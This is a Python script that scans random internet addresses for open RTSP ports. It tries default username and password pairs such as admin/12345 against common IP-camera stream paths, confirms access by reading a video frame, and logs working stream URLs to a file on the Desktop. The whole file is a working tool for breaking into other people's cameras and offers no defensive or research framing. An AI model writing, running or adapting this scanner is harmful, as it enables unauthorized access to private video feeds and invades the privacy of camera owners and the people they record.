import os
import sys

devnull = os.open(os.devnull, os.O_WRONLY)
os.dup2(devnull, 2)
os.close(devnull)

os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "rtsp_transport;tcp|timeout;2000000"

import socket
import threading
import random
import time
import queue
import base64
import cv2
from colorama import init, Fore, Style

init()

file_lock = threading.Lock()
ip_queue = queue.Queue(maxsize=50)

users = ["admin", "root", ""]
passwords = ["admin", "12345", "123456", ""]
paths = [
    "/live/ch0",
    "/Streaming/Channels/101",
    "/cam/realmonitor?channel=1&subtype=0",
    "/stream1",
    "/h264"
]

def main():
    os.system("title made by @000nico")
    os.system("mode con cols=60 lines=20")
    print("please wait...")

    for _ in range(960):
        t = threading.Thread(target=findIps)
        t.daemon = True
        t.start()

    for _ in range(40):
        t = threading.Thread(target=processIps)
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)

def findIps():
    while True:
        ip = generateIp()
        if checkIpandPort(ip):
            ip_queue.put(ip)

def processIps():
    while True:
        ip = ip_queue.get()
        checkRtsp(ip)

def generateIp():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def checkIpandPort(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((ip, 554))
        s.close()
        return result == 0
    except:
        return False

def testRtsp(ip, user, password, path):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, 554))
        s.settimeout(3)

        s.send(f"OPTIONS rtsp://{ip}{path} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
        s.recv(1024).decode(errors="ignore")

        creds = base64.b64encode(f"{user}:{password}".encode()).decode()
        s.send((f"DESCRIBE rtsp://{ip}{path} RTSP/1.0\r\n"
                f"CSeq: 2\r\n"
                f"Authorization: Basic {creds}\r\n\r\n").encode())
        res = s.recv(2048).decode(errors="ignore")
        s.close()

        return "200 OK" in res

    except:
        return False

def verifyStream(rtsp_url):
    try:
        cap = cv2.VideoCapture(rtsp_url, cv2.CAP_FFMPEG)
        if cap.isOpened():
            ret, frame = cap.read()
            cap.release()
            return ret and frame is not None
        cap.release()
        return False
    except:
        return False

def checkRtsp(ip):
    for password in passwords:
        for user in users:
            for path in paths:
                rtsp_url = f"rtsp://{user}:{password}@{ip}{path}"
                if testRtsp(ip, user, password, path):
                    if verifyStream(rtsp_url):
                        print(Fore.GREEN + f"[+] {rtsp_url}" + Style.RESET_ALL)
                        saveResult(rtsp_url)
                    else:
                        print(Fore.YELLOW + f"[~] {rtsp_url}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"[-] {rtsp_url}" + Style.RESET_ALL)

def saveResult(rtsp_url):
    try:
        with file_lock:
            path = os.path.join(os.path.expanduser("~"), "Desktop", "cameras.txt")
            with open(path, "a", encoding="utf-8") as f:
                f.write(rtsp_url + "\n")
                f.flush()
            print(Fore.CYAN + f"[SAVED] {rtsp_url}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.CYAN + f"[ERROR SAVING] {e}" + Style.RESET_ALL)

if __name__ == "__main__":
    main()